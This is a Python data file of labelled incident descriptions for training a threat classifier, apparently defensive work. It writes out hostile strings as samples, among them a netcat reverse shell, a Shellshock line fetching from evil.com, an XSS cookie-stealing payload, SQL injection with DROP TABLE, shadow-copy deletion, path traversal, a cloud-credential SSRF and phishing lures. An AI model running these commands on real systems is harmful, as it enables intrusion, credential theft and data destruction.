"""
Curated forensic cyber incident dataset for training the ML Threat Classifier.
Encompasses diverse attack vectors:
- Ransomware & Malware
- Phishing & Credential Theft
- Web Application Attacks (SQLi, XSS, Path Traversal)
- Network Intrusion & Brute Force
- Privilege Escalation & Persistence
- Benign System Operations
"""

TRAINING_DATA = [
    # ── RANSOMWARE & MALWARE ──
    ("All your files have been encrypted with RSA-4096. Send 0.5 Bitcoin to wallet address to receive decryptor key.", "Ransomware"),
    ("YOUR IMPORTANT FILES ARE ENCRYPTED! Read instructions_decrypt.txt to recover your documents and databases.", "Ransomware"),
    ("WannaCry locker detected. Volume shadow copies deleted via vssadmin delete shadows /all /quiet.", "Ransomware"),
    ("DarkSide ransomware payload executed. Shadow copy service stopped and system restore points purged.", "Ransomware"),
    ("Files appended with .locky extension. Ransom note left in desktop directory.", "Ransomware"),
    ("Cryptolocker active. Registry persistence established at HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.", "Ransomware"),
    ("BlackCat ransomware discovered. AES-256 key encrypted with attacker public key.", "Ransomware"),
    ("Ryuk ransomware executing cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet and bcdedit /set {default} recoveryenabled No.", "Ransomware"),
    ("LockBit 3.0 notification: Your corporate infrastructure has been locked. Contact us via Tox chat.", "Ransomware"),
    ("Revil ransomware script: net stop vss, net stop backup, del /f /s /q C:\\*.bac.", "Ransomware"),
    ("Trojan.Downloader detected connecting to C2 IP 185.220.101.5 on port 4444.", "Malware"),
    ("Cobalt Strike beacon beacon.dll injected into explorer.exe process memory.", "Malware"),
    ("Mimikatz sekurlsa::logonpasswords executed to dump LSASS credentials from memory.", "Malware"),
    ("Keylogger hook installed via SetWindowsHookEx on WH_KEYBOARD_LL.", "Malware"),
    ("Backdoor payload installed as systemd service /etc/systemd/system/backdoor.service.", "Malware"),
    ("Reverse shell initiated: nc -e /bin/bash 198.51.100.23 8080.", "Malware"),
    ("Meterpreter session opened over HTTPS transport to command and control domain evil-c2.net.", "Malware"),
    ("Obfuscated PowerShell payload: powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==.", "Malware"),
    ("Rootkit detected modifying kernel system call table sys_call_table.", "Malware"),

    # ── PHISHING & CREDENTIAL THEFT ──
    ("URGENT: Your Office 365 password expires in 2 hours. Click here to verify your Microsoft account login: http://login-microsoft-secure.net", "Phishing"),
    ("Security Alert: Unauthorized sign-in detected on your Google Account from Moscow, Russia. Re-verify your password now: http://accounts-google-verify.cc", "Phishing"),
    ("Dear employee, payroll direct deposit failed. Update your banking credentials at http://portal-payroll-update.org to receive direct payment.", "Phishing"),
    ("Wells Fargo Online Alert: Your debit card is suspended due to suspicious activity. Enter OTP and PIN at http://wellsfargo-card-verify.com", "Phishing"),
    ("DocuSign: Please review and sign document 'Invoice_99218.pdf' by entering your company email password at http://docusign-docs-view.ru", "Phishing"),
    ("IT Support Notice: VPN upgrade required immediately. Submit your corporate active directory username and password.", "Phishing"),
    ("Internal HR survey with required login credentials to receive annual benefits bonus.", "Phishing"),
    ("Credential harvesting kit detected on landing page with fake login form capturing email, password, and session token.", "Phishing"),
    ("Email spoofing detected: SPF fail, DKIM invalid, sender domain paypal-security-department.info mimicking paypal.com.", "Phishing"),
    ("Telegram phishing bot capturing 2FA two-factor authentication codes and SMS OTP tokens.", "Phishing"),

    # ── WEB APPLICATION EXPLOITS (SQLi, XSS, SSRF) ──
    ("GET /users?id=1' UNION SELECT username, password_hash, email FROM users--", "SQL Injection"),
    ("POST /api/login HTTP/1.1 with payload username=admin' OR '1'='1' -- and password=x", "SQL Injection"),
    ("SELECT * FROM accounts WHERE user_id = '' OR 1=1; DROP TABLE logs; --", "SQL Injection"),
    ("Boolean-based blind SQL injection detected: AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)", "SQL Injection"),
    ("Time-based blind SQL injection payload: '; WAITFOR DELAY '0:0:15'--", "SQL Injection"),
    ("Database extraction attempt: SELECT table_name FROM information_schema.tables WHERE table_schema=database()", "SQL Injection"),
    ("Sqlmap automated scanner detected testing injection points on /search.php?q=*", "SQL Injection"),
    ("Cross-site scripting payload: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>", "Web Exploit"),
    ("<img src=x onerror=alert('XSS_EXEC')> injected into comments parameter", "Web Exploit"),
    ("Remote code execution attempt: /cgi-bin/test.sh HTTP/1.1 with User-Agent: () { :;}; /bin/bash -c 'wget http://evil.com/sh | bash'", "Web Exploit"),
    ("Path traversal attack: GET /download?file=../../../../etc/passwd HTTP/1.1", "Web Exploit"),
    ("Directory traversal attempt: ..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts requested", "Web Exploit"),
    ("Server-Side Request Forgery (SSRF) to AWS metadata service: http://169.254.169.254/latest/meta-data/iam/security-credentials/", "Web Exploit"),

    # ── NETWORK INTRUSION & BRUTE FORCE ──
    ("SSH brute force detected: 485 failed login attempts for user root from IP 194.26.29.112 in 60 seconds.", "Brute Force"),
    ("RDP brute force attack on port 3389: Event ID 4625 recorded 1,200 times with user administrator.", "Brute Force"),
    ("Hydra network cracker running dictionary attack against FTP service on port 21.", "Brute Force"),
    ("Kerberoasting attack: High volume of Kerberos TGS-REQ requests for SPNs with RC4 encryption.", "Brute Force"),
    ("Password spraying detected: 1 attempt per minute across 5,000 distinct user accounts using Season2026! password.", "Brute Force"),
    ("Port scan detected: SYN scan from 45.143.203.2 across ports 1-65535.", "Network Reconnaissance"),
    ("Nmap aggressive scan detected: nmap -sS -sV -O -p- 10.0.0.15 with NSE script engine running.", "Network Reconnaissance"),
    ("Masscan packet burst detected targeting subnet 192.168.1.0/24 rate 10000 kpps.", "Network Reconnaissance"),

    # ── PRIVILEGE ESCALATION & LATERAL MOVEMENT ──
    ("User www-data added to /etc/sudoers with NOPASSWD: ALL permission.", "Privilege Escalation"),
    ("Pass-the-Hash attack: WMI connection authenticated with NTLM hash without cleartext password.", "Privilege Escalation"),
    ("Dirty COW Linux kernel exploit CVE-2016-5195 executed to overwrite /etc/passwd.", "Privilege Escalation"),
    ("PsExec execution: service psexecsvc created on remote host DC01.corp.local.", "Lateral Movement"),
    ("Scheduled task created: schtasks /create /tn 'SystemUpdate' /tr 'C:\\Temp\\rev.exe' /sc ONSTART /ru SYSTEM.", "Persistence"),
    ("Active Directory replication DCSync attack: DS-Replication-Get-Changes-All requested by non-DC account.", "Privilege Escalation"),

    # ── BENIGN / NORMAL SYSTEM OPERATIONS ──
    ("System boot sequence completed in 14.2 seconds. All kernel modules verified.", "Benign"),
    ("CRON job /usr/bin/certbot renew executed successfully. SSL certificate valid for 88 days.", "Benign"),
    ("User jane.doe successfully logged in via Okta SAML SSO with MFA push notification accepted.", "Benign"),
    ("NTP synchronization with time.nist.gov offset 0.002 seconds. Clock updated.", "Benign"),
    ("Database daily backup completed: 42GB written to encrypted S3 bucket s3://corp-backups-secure.", "Benign"),
    ("Monthly security patch KB5021233 installed successfully. System restart scheduled for 02:00 AM.", "Benign"),
    ("Docker container web-frontend-production healthcheck passed: HTTP 200 OK latency 18ms.", "Benign"),
    ("Investigator logged into digital forensics workstation using FIDO2 hardware token.", "Benign"),
    ("Package manager apt update completed: 0 packages upgraded, 0 newly installed.", "Benign"),
    ("Firewall rule permit TCP 443 from internal subnet 10.10.0.0/16 to AWS CloudFront CDN.", "Benign"),
    ("Evidence SHA-256 hash calculated and confirmed matching chain of custody record.", "Benign"),
    ("Normal user browsing session: GET /index.html 200 OK User-Agent: Mozilla/5.0 Windows NT 10.0.", "Benign"),
]
